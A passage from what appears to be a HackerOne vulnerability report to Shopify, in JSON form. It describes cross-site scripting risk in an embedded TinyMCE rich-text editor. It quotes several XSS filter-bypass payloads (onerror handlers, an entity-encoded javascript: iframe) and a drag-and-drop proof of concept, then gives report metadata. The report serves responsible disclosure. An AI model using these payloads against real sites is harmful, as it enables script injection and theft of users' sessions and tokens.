target=&quot;_blank&quot;&gt;Firfox&lt;/a&gt;\n</code></pre>\n<p><a href=\"/redirect?signature=7763565395e5f90dfe75e17a3254313df45c9d02&amp;url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F3114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Filter confusion 1</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;\n</code></pre>\n<p><a href=\"https://hackerone.com/reports/81736\">Filter confusion 2</a> and <a href=\"/redirect?signature=6acf6e7a0515e7e152654e9b8ce179fa6024f1d1&amp;url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F2356\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>here</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&lt;HTML xmlns: &gt;&lt;audio&gt;\n&lt;audio src=wp onerror=alert(0X1)&gt;\n</code></pre>\n<p><a href=\"/redirect?signature=3cdc173c049c319b8e7cc2b2c23da765d3cfa790&amp;url=https%3A%2F%2Fgithub.com%2Ftinymce%2Ftinymce%2Fissues%2F2132\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Filter confusion 3</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&amp;ltg;?&quot;&gt;&amp;ltg;iframe SRC=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&gt;?&gt;\n</code></pre>\n<p>While unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.</p>\n\n<p>Here is the poc:</p>\n<pre class=\"highlight plaintext\"><code>&lt;div draggable=&quot;true&quot; ondragstart=&quot;event.dataTransfer.setData(&#39;text/html&#39;, &#39;&lt;img src=\\&#39;https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\\&#39;/&gt;&#39;); document.location=&#39;https://app.shopify.com//services/mobile_app/rte&#39;&quot;&gt;drag&lt;/div&gt;\n</code></pre>\n<p>Save that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.</p>\n\n<p>Considering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}